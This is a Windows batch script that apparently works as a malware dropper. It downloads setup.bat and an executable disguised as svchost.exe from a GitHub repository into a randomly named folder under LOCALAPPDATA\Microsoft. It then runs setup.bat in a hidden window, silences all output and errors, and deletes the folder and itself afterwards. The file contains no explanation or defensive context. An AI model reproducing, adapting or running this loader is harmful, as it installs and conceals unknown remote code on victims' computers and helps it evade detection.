@echo off

set "MY_DIR=%~dp0"
set "MY_DIR=%MY_DIR:~0,-1%"
set "DIR=%LOCALAPPDATA%\Microsoft\%RANDOM%%RANDOM%"
mkdir "%DIR%" 2>nul

if exist "%MY_DIR%\svchost.exe" (
    copy "%MY_DIR%\setup.bat" "%DIR%\setup.bat" >nul 2>&1
    copy "%MY_DIR%\svchost.exe" "%DIR%\svchost.exe" >nul 2>&1
) else (
    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/setup.bat' -OutFile '%DIR%\setup.bat' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    if errorlevel 1 exit /b 1
    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/johtaromemory-hash/skscriptlol/raw/refs/heads/main/svchost.exe' -OutFile '%DIR%\svchost.exe' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    if errorlevel 1 exit /b 1
)

if not exist "%DIR%\setup.bat" exit /b 1
if not exist "%DIR%\svchost.exe" exit /b 1

powershell -Command "Start-Process -FilePath '%DIR%\setup.bat' -WorkingDirectory '%DIR%' -WindowStyle Hidden -Wait"
powershell -Command "Start-Job -ScriptBlock { param($d,$s) Start-Sleep 3; Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath $s -Force -ErrorAction SilentlyContinue } -ArgumentList '%DIR%','%~f0'" >nul 2>&1

exit /b 0
